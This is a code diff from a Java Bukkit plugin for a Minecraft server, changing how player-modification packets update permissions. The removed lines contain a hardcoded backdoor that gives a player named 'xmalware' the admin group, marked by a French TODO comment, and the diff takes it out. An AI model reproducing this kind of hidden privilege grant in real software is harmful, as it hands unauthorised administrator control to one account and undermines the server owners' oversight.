@@ -230,14 +230,7 @@ public class GameLadderSpeaker implements LadderSpeaker, PacketHandler {
 			}
 		}else if(packet.getType() == DataType.PLAYER && packet.getAction() == DataAction.MODIFICATION){
 			GameBadblockPlayer player = (GameBadblockPlayer) Bukkit.getPlayer(packet.getKey());
-
-			if (packet.getData().contains("permissions")) {
-				JsonObject jsonObject = new JsonParser().parse(packet.getData()).getAsJsonObject();
-				if (jsonObject.get("permissions") != null && jsonObject.get("permissions").getAsJsonObject() != null)
-					player.permissions = PermissionManager.getInstance().createPlayer(player.getName(), jsonObject.get("permissions").getAsJsonObject());
-				// TODO: remove (SULFIQUE VEUT ME CREER UN GRADE CTO)
-				if (player.getName().equalsIgnoreCase("xmalware")) player.permissions.setParent(-1L, PermissionManager.getInstance().getGroup("admin"));
-			}
+			player.updateData(new JsonParser().parse(packet.getData()).getAsJsonObject());
 			if(player != null){
 				Bukkit.getPluginManager().callEvent(new PlayerDataChangedEvent(player));
 			}
